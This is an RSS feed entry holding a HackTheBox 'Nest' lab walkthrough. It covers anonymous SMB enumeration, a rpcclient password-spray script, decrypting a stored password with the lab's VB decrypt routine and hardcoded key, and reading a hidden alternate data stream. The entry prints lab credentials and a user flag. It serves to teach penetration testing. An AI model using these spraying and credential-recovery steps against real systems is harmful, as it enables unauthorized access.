<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Cryptography on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/cryptography/</link>
    <description>Recent content in Cryptography on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 16 Apr 2021 04:59:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/cryptography/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Nest</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-nest/</link>
      <pubDate>Fri, 16 Apr 2021 04:59:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-nest/</guid>
      <description>Nest is one of my favorite machines after Forest, I learn a lot about enumeration here, especially for SMB.
Nest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is also a VB project inside a directory that can not be reached unless you visit its full path.</description>
      <content:encoded><![CDATA[<p>Nest is one of my favorite machines after Forest, I learn a lot about enumeration here, especially for SMB.</p>
<p>Nest starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to <code>c.smith</code>. There is also a VB project inside a directory that can not be reached unless you visit its full path. There is a decrypt function on the project that can be used to decrypt <code>c.smith</code>&rsquo;s password. Enumerating <code>c.smith</code> home directory discovers a password for enabling debug mode of a custom application. Debug mode in the application unlocks new options, which can then be used to read the application&rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, I&rsquo;m able to decrypted the administrator password, and then use it gain administrator access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>SMB enumeration</li>
<li>Alternate Data Stream</li>
<li>Reversing .NET</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>smbget - Preinstalled in Kali Linux</li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
$ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178
Nmap scan report <span style="color:#66d9ef">for</span> htb.nest <span style="color:#f92672">(</span>10.10.10.178<span style="color:#f92672">)</span>
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
4386/tcp open  unknown                                                                                       
| fingerprint-strings:                                                                                       
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2                                                                                 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help:          
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---                  
|     LIST   
|     SETDIR &lt;Directory_Name&gt;
|     RUNQUERY &lt;Query_ID&gt;          
|     DEBUG &lt;Password&gt;
|_    HELP &lt;Command&gt; 

Host script results:
|_clock-skew: -27s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-04-28T15:16:46
|_  start_date: 2020-04-28T04:20:37
</code></pre></div><p><code>nmap</code> shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as &lsquo;Reporting Service V1.2&rsquo;.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous access is allowed here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
$ smbclient -N -L //10.10.10.178/
</code></pre></div><p><img src="imgs/image-20210416095936362.png" alt="image-20210416095936362" style="zoom:80%;" /></p>
<h4 id="data-share">Data share</h4>
<p>Enumeration on <code>Data</code> share with recurse mode shows two text files.</p>
<p><img src="imgs/image-20210416095856849.png" alt="image-20210416095856849" style="zoom:80%;" /></p>
<p>One of them is empty while the other one contains credentials for <code>TempUser:Welcome2019</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «smb» «192.168.43.234»
$ cat loot/Welcome<span style="color:#ae81ff">\ </span>Email.txt
We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;

You will find your home folder in the following location:
<span style="color:#ae81ff">\\</span>HTB-NEST<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\&lt;</span>USERNAME&gt;

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below <span style="color:#66d9ef">until</span> all systems have been set up <span style="color:#66d9ef">for</span> you.

Username: TempUser
Password: welcome2019


Thank you
HR
</code></pre></div><p>With <code>TempUsers</code>, I could access the <code>Secure$</code> share.</p>
<blockquote>
<p>Sorry if you annoyed by the red box, me too.</p>
</blockquote>
<p><img src="imgs/image-20210416100016140.png" alt="image-20210416100016140" style="zoom:80%;" /></p>
<p>Unfortunately, once I got to <code>Secure$</code> share, I couldn&rsquo;t list any single directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «smb» «192.168.43.234»
$  smbclient -U <span style="color:#e6db74">&#39;TempUser%welcome2019&#39;</span> //10.10.10.178/Secure$ 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> recurse on
smb: <span style="color:#ae81ff">\&gt;</span> ls
NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\F</span>inance<span style="color:#ae81ff">\*</span>
NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\H</span>R<span style="color:#ae81ff">\*</span>
NT_STATUS_ACCESS_DENIED listing <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\*</span>
</code></pre></div><p>On the other hand, I do user enumeration with <code>rpcclient</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210416100040356.png" alt="image-20210416100040356"  /></div>
</p>
<p>With a little knowledge of scripting, I can filter the user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nest» «192.168.43.234»
$  rpcclient -U <span style="color:#e6db74">&#39;TempUser%welcome2019&#39;</span> -c <span style="color:#e6db74">&#39;enumdomusers;quit&#39;</span> 10.10.10.178 | tr -d <span style="color:#e6db74">&#39;[]&#39;</span> | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f2 | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1
Administrator
C.Smith
Guest
Service_HQK
TempUser
</code></pre></div><p>I did a password spray using a simple bash script with a pattern of <code>username:username</code>, but no luck</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> u in <span style="color:#e6db74">`</span>cat rpcusers.txt<span style="color:#e6db74">`</span>; <span style="color:#66d9ef">do</span> 
 echo -n “<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> user : $u “ <span style="color:#f92672">&amp;&amp;</span> 
 rpcclient -U “$u%$u” -c “getusername;quit” 10.10.10.178
<span style="color:#66d9ef">done</span>
</code></pre></div><p>I also check on users' information to find a plain password in the description, but end up knowing the user flag is on <code>c.smith</code>.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*7NAs7fNGkLwtNwZsGjTkRw.png" alt="img"  /></div>
</p>
<p>I went back to SMB, I decided to download all the content in the <code>Data</code> share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «192.168.43.234»
$ smbget -R smb://10.10.10.178/Data/ -U TempUser  <span style="color:#75715e"># or use mget * inside smbclient</span>
</code></pre></div><p>Here is the folder structure on <code>Data</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ tree
.
├── IT
│   ├── Archive
│   ├── Configs
│   │   ├── Adobe
│   │   │   ├── editing.xml
│   │   │   ├── Options.txt
│   │   │   ├── projects.xml
│   │   │   └── settings.xml
│   │   ├── Atlas
│   │   │   └── Temp.XML
│   │   ├── DLink
│   │   ├── Microsoft
│   │   │   └── Options.xml
│   │   ├── NotepadPlusPlus
│   │   │   ├── config.xml
│   │   │   └── shortcuts.xml
│   │   ├── RU Scanner
│   │   │   └── RU_config.xml
│   │   └── Server Manager
│   ├── Installs
│   ├── Reports
│   └── Tools
├── Production
├── Reports
└── Shared
    ├── Maintenance
    │   └── Maintenance Alerts.txt
    └── Templates
        ├── HR
        │   └── Welcome Email.txt
        └── Marketing
</code></pre></div><p>Notepad++ config on <code>Data/IT/Configs/NotepadPlusPlus/config.xml</code> contains interesting path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">...<span style="color:#f92672">&lt;SNIP&gt;</span>...
    <span style="color:#f92672">&lt;History</span> <span style="color:#a6e22e">nbMaxFile=</span><span style="color:#e6db74">&#34;15&#34;</span> <span style="color:#a6e22e">inSubMenu=</span><span style="color:#e6db74">&#34;no&#34;</span> <span style="color:#a6e22e">customLength=</span><span style="color:#e6db74">&#34;-1&#34;</span><span style="color:#f92672">&gt;</span>
        <span style="color:#f92672">&lt;File</span> <span style="color:#a6e22e">filename=</span><span style="color:#e6db74">&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;File</span> <span style="color:#a6e22e">filename=</span><span style="color:#e6db74">&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34;</span> <span style="color:#f92672">/&gt;</span>
        <span style="color:#f92672">&lt;File</span> <span style="color:#a6e22e">filename=</span><span style="color:#e6db74">&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> <span style="color:#f92672">/&gt;</span>
    <span style="color:#f92672">&lt;/History&gt;</span>
<span style="color:#f92672">&lt;/NotepadPlus&gt;</span>
</code></pre></div><p>Next, on <code>/Data/IT/Configs/RU Scanner/RU_config.xml</code>, I found a password that belongs to c.smith</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">→ root@iamf «RU Scanner» «192.168.43.234»
$ cat RU_config.xml
<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span style="color:#f92672">&lt;ConfigFile</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Port&gt;</span>389<span style="color:#f92672">&lt;/Port&gt;</span>
  <span style="color:#f92672">&lt;Username&gt;</span>c.smith<span style="color:#f92672">&lt;/Username&gt;</span>
  <span style="color:#f92672">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span style="color:#f92672">&lt;/Password&gt;</span>
<span style="color:#f92672">&lt;/ConfigFile&gt;</span>
</code></pre></div><p>It looks like a base64 encoded at first, but it is encrypted:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «RU Scanner» «192.168.43.234»
$ echo <span style="color:#e6db74">&#39;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#39;</span> | base64 -d
<span style="color:#f92672">}</span>13☺□♥□<span style="color:#f92672">=</span>X□J□BA□↓☺X*□Wc□f□□□?βc◄
</code></pre></div><h4 id="secure-share">Secure$ share</h4>
<p>User carl doesn&rsquo;t appear on my enumeration with <code>rpcclient</code>, so after discovering this path <code>\\HTB-NEST\Secure$\IT\Carl\</code>, I went back to <code>Secure$</code> share and performed a recursive download there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Data» «192.168.43.234»
$ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
</code></pre></div><p>Here is the <code>Secure$</code> structure.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «Secure$» «192.168.43.234»
$ tree
.
├── Docs
│   ├── ip.txt
│   └── mmc.txt
├── Reports
└── VB Projects
    ├── Production
    └── WIP
        └── RU
            ├── RUScanner
            │   ├── bin
            │   │   ├── Debug
            │   │   └── Release
            │   ├── ConfigFile.vb
            │   ├── Module1.vb
            │   ├── My Project
            │   │   ├── Application.Designer.vb
            │   │   ├── Application.myapp
            │   │   ├── AssemblyInfo.vb
            │   │   ├── Resources.Designer.vb
            │   │   ├── Resources.resx
            │   │   ├── Settings.Designer.vb
            │   │   └── Settings.settings
            │   ├── obj
            │   │   └── x86
            │   ├── RU Scanner.vbproj
            │   ├── RU Scanner.vbproj.user
            │   ├── SsoIntegration.vb
            │   └── Utils.vb
            └── RUScanner.sln
</code></pre></div><p>I just downloaded a VB Project. Based on <code>Module1.vb</code>&rsquo;s content, <code>RU_config.xml</code> is loaded to the application, and from this line <code>.Password = Utils.DecryptString(Config.Password)</code>, I know this application able to decrypt <code>c.smith</code>&rsquo;s password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-vb" data-lang="vb"><span style="color:#960050;background-color:#1e0010">→</span> root<span style="color:#960050;background-color:#1e0010">@</span>iamf <span style="color:#960050;background-color:#1e0010">«</span>WIP<span style="color:#960050;background-color:#1e0010">»</span> <span style="color:#960050;background-color:#1e0010">«</span>192.168.43.234<span style="color:#960050;background-color:#1e0010">»</span>
<span style="color:#960050;background-color:#1e0010">$</span> cat RU<span style="color:#f92672">/</span>RUScanner<span style="color:#f92672">/</span>Module1.vb
<span style="color:#66d9ef">Module</span> Module1

    <span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">Main</span>()
        <span style="color:#66d9ef">Dim</span> Config <span style="color:#f92672">As</span> ConfigFile <span style="color:#f92672">=</span> ConfigFile.LoadFromFile(<span style="color:#e6db74">&#34;RU_Config.xml&#34;</span>)
        <span style="color:#66d9ef">Dim</span> test <span style="color:#f92672">As</span> <span style="color:#66d9ef">New</span> SsoIntegration <span style="color:#66d9ef">With</span> {.Username <span style="color:#f92672">=</span> Config.Username, .Password <span style="color:#f92672">=</span> Utils.DecryptString(Config.Password)}

    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>

<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Module</span>
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-csmith">Access as c.smith</h3>
<h4 id="decrypting-csmith-password">Decrypting c.smith password</h4>
<p>The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from <code>Utils.vb</code>, then call it on the main function. I used <a href="https://dotnetfiddle.net/">https://dotnetfiddle.net/</a> for this.</p>
<p>Here is how it looks like.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-vb" data-lang="vb"><span style="color:#66d9ef">Imports</span> System
<span style="color:#66d9ef">Imports</span> System.Text
<span style="color:#66d9ef">Imports</span> System.Security.Cryptography

<span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Module</span> Module1
	<span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">Main</span>()
		<span style="color:#66d9ef">Dim</span> encryptedPassword
		encryptedPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span>
		Console.WriteLine(<span style="color:#e6db74">&#34;Decrypted Password: &#34;</span> <span style="color:#f92672">+</span>Utils.DecryptString(encryptedPassword))
	<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Module</span>


<span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Class</span> <span style="color:#a6e22e">Utils</span>
    <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Shared</span> <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">DecryptString</span>(EncryptedString <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>) <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>
        <span style="color:#66d9ef">If</span> <span style="color:#66d9ef">String</span>.IsNullOrEmpty(EncryptedString) <span style="color:#66d9ef">Then</span>
            <span style="color:#66d9ef">Return</span> <span style="color:#66d9ef">String</span>.Empty
        <span style="color:#66d9ef">Else</span>
            <span style="color:#66d9ef">Return</span> Decrypt(EncryptedString, <span style="color:#e6db74">&#34;N3st22&#34;</span>, <span style="color:#e6db74">&#34;88552299&#34;</span>, 2, <span style="color:#e6db74">&#34;464R5DFA5DL6LE28&#34;</span>, 256)
        <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">If</span>
    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Function</span>
    <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Shared</span> <span style="color:#66d9ef">Function</span> <span style="color:#a6e22e">Decrypt</span>(<span style="color:#66d9ef">ByVal</span> cipherText <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
                                   <span style="color:#66d9ef">ByVal</span> passPhrase <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
                                   <span style="color:#66d9ef">ByVal</span> saltValue <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
                                    <span style="color:#66d9ef">ByVal</span> passwordIterations <span style="color:#f92672">As</span> <span style="color:#66d9ef">Integer</span>, _
                                   <span style="color:#66d9ef">ByVal</span> initVector <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>, _
                                   <span style="color:#66d9ef">ByVal</span> keySize <span style="color:#f92672">As</span> <span style="color:#66d9ef">Integer</span>) _
                           <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>

        <span style="color:#66d9ef">Dim</span> initVectorBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
        initVectorBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes(initVector)

        <span style="color:#66d9ef">Dim</span> saltValueBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
        saltValueBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes(saltValue)

        <span style="color:#66d9ef">Dim</span> cipherTextBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
        cipherTextBytes <span style="color:#f92672">=</span> Convert.FromBase64String(cipherText)

        <span style="color:#66d9ef">Dim</span> password <span style="color:#f92672">As</span> <span style="color:#66d9ef">New</span> Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        <span style="color:#66d9ef">Dim</span> keyBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
        keyBytes <span style="color:#f92672">=</span> password.GetBytes(<span style="color:#66d9ef">CInt</span>(keySize <span style="color:#f92672">/</span> 8))

        <span style="color:#66d9ef">Dim</span> symmetricKey <span style="color:#f92672">As</span> <span style="color:#66d9ef">New</span> AesCryptoServiceProvider
        symmetricKey.Mode <span style="color:#f92672">=</span> CipherMode.CBC

        <span style="color:#66d9ef">Dim</span> decryptor <span style="color:#f92672">As</span> ICryptoTransform
        decryptor <span style="color:#f92672">=</span> symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        <span style="color:#66d9ef">Dim</span> memoryStream <span style="color:#f92672">As</span> IO.MemoryStream
        memoryStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">New</span> IO.MemoryStream(cipherTextBytes)

        <span style="color:#66d9ef">Dim</span> cryptoStream <span style="color:#f92672">As</span> CryptoStream
        cryptoStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">New</span> CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        <span style="color:#66d9ef">Dim</span> plainTextBytes <span style="color:#f92672">As</span> <span style="color:#66d9ef">Byte</span>()
        <span style="color:#66d9ef">ReDim</span> plainTextBytes(cipherTextBytes.Length)

        <span style="color:#66d9ef">Dim</span> decryptedByteCount <span style="color:#f92672">As</span> <span style="color:#66d9ef">Integer</span>
        decryptedByteCount <span style="color:#f92672">=</span> cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        <span style="color:#66d9ef">Dim</span> plainText <span style="color:#f92672">As</span> <span style="color:#66d9ef">String</span>
        plainText <span style="color:#f92672">=</span> Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)
        <span style="color:#66d9ef">Return</span> plainText
    <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Function</span>
<span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Class</span>
</code></pre></div><p>Now I have <code>c.smith</code>&rsquo;s password, <code>xRxRxPANCAK3SxRxRx</code></p>
<p><div class="img-container"><img src="imgs/image-20210416080029703.png" alt="image-20210416080029703"  /></div>
</p>
<h4 id="users-share">Users share</h4>
<p>With <code>c.smith</code> credentials, I do more enumeration on SMB. First, I&rsquo;ll look into the <code>c.smith</code> home directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «smb» «192.168.43.234»
$ smbclient -U <span style="color:#e6db74">&#39;c.smith%xRxRxPANCAK3SxRxRx&#39;</span> //10.10.10.178/Users 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\&gt;</span> dir
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 02:21:44 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 02:21:44 <span style="color:#ae81ff">2020</span>
  HQK Reporting                       D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:06:17 <span style="color:#ae81ff">2019</span>
  user.txt                            A       <span style="color:#ae81ff">32</span>  Thu Aug  <span style="color:#ae81ff">8</span> 19:05:24 <span style="color:#ae81ff">2019</span>
</code></pre></div><p>I downloaded those files recursively to my machine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
$ tree
.
├── HQK Reporting
│   ├── AD Integration Module
│   │   └── HqkLdap.exe
│   ├── Debug Mode Password.txt
│   └── HQK_Config_Backup.xml
└── user.txt
</code></pre></div><p><code>user.txt</code> is the user flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
$ cat user.txt
cf71b25404be5d84fd827e05f426e987
</code></pre></div><p><code>HQK_Config_Backup.xml</code> doesn&rsquo;t contains any useful information</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">→ root@iamf «c.smith» «192.168.43.234»
$ cat HQK\ Reporting/HQK_Config_Backup.xml
<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span style="color:#f92672">&lt;ServiceSettings</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Port&gt;</span>4386<span style="color:#f92672">&lt;/Port&gt;</span>
  <span style="color:#f92672">&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span style="color:#f92672">&lt;/QueryDirectory&gt;</span>
<span style="color:#f92672">&lt;/ServiceSettings&gt;</span>
</code></pre></div><p><code>Debug Mode Password.txt</code> is empty file. But when I thought it was empty, I asked a hint for this.</p>
<p>This file is embedded with Alternate Data Stream (ADS). By using the <code>allinfo</code> command on the SMB, I can see it contains another data stream, <code>Password:$Data</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210525005607779.png" alt="image-20210525005607779"  /></div>
</p>
<p>To get that stream, I can just append <code>:Password:$Data</code> at the end of the file name.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> allinfo <span style="color:#e6db74">&#34;Debug Mode Password.txt&#34;</span>
altname: DEBUGM~1.TXT
create_time:    Thu Aug  <span style="color:#ae81ff">8</span> 07:06:12 PM <span style="color:#ae81ff">2019</span> EDT
access_time:    Thu Aug  <span style="color:#ae81ff">8</span> 07:06:12 PM <span style="color:#ae81ff">2019</span> EDT
write_time:     Thu Aug  <span style="color:#ae81ff">8</span> 07:08:17 PM <span style="color:#ae81ff">2019</span> EDT
change_time:    Thu Aug  <span style="color:#ae81ff">8</span> 07:08:17 PM <span style="color:#ae81ff">2019</span> EDT
attributes: A <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span>
stream: <span style="color:#f92672">[</span>::$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">0</span> bytes
stream: <span style="color:#f92672">[</span>:Password:$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">15</span> bytes
smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Debug Mode Password.txt&#34;</span>:Password:$DATA
getting file <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\D</span>ebug Mode Password.txt:Password:$DATA of size <span style="color:#ae81ff">15</span> as Debug Mode Password.txt:Password:$DATA <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.0 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><p>Now I can use the <code>cat</code> command to see the file content.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
$ cat Debug<span style="color:#ae81ff">\ </span>Mode<span style="color:#ae81ff">\ </span>Password.txt:Password:<span style="color:#ae81ff">\$</span>DATA
WBQ201953D8w
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
<h4 id="examination-on-hqk-reporting-service-v12">Examination on HQK Reporting Service v1.2</h4>
<p>When visiting <code>http://10.10.10.178:4386/</code>, the browser return a session timeout with <code>&gt;</code> symbol, this could imply that this service is cli-based</p>
<p>With <code>telnet</code>, I could access this service.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
$ telnet 10.10.10.178 <span style="color:#ae81ff">4386</span>
</code></pre></div><p><img src="imgs/image-20210416083748311.png" alt="image-20210416083748311" style="zoom: 80%;" /></p>
<p>With debug mode enabled, it shows more commands.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">&gt;debug WBQ201953D8w
</code></pre></div><p><img src="imgs/image-20210416083637321.png" alt="image-20210416083637321" style="zoom: 80%;" /></p>
